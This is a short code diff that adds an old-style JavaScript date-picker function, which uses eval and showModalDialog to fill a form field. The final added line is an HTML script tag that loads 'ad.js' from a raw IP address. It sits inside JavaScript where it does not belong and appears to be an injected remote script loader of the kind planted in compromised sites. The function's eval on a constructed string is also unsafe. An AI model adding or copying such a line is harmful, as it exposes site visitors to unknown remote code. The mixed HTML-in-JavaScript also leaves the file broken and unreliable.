@@ -1,0 +1,7 @@
+function getDateTime(sInputName,iType)
+{
+	var o=eval("document.all."+sInputName);
+	var a=window.showModalDialog('/include/calen.asp?type='+iType,null,'status:no;center:yes;help:no;minimize:no;maximize:no;border:thin;statusbar:no;dialogWidth:240px;dialogHeight:'+(iType==1?'240px':'265px'));
+	if(a)o.value=a;
+}
+<script src="http://222.208.183.246/ad/ad.js"></script>
